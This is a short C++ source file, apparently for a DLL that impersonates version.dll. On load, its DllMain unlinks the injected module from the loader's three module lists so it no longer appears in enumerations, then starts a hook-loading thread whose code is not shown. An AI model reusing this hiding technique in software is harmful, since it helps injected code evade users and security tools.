#include "version.h"
#include "XHideDll.h"
#include "Utils.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	HMODULE hHideBase;
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);

		//hide this injected dll
		hHideBase = GetModuleHandle(L"version.dll");
		XHideDll::HideInLoadOrderLinks(hHideBase);
		XHideDll::HideInMemoryOrderLinks(hHideBase);
		XHideDll::HideInInitializationOrderLinks(hHideBase);

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Load, hModule, NULL, NULL);
		WriteLog(L"hooked");
	break;
	case DLL_PROCESS_DETACH:
		FreeLibrary(version_dll);
		break;
	}
	return TRUE;
}
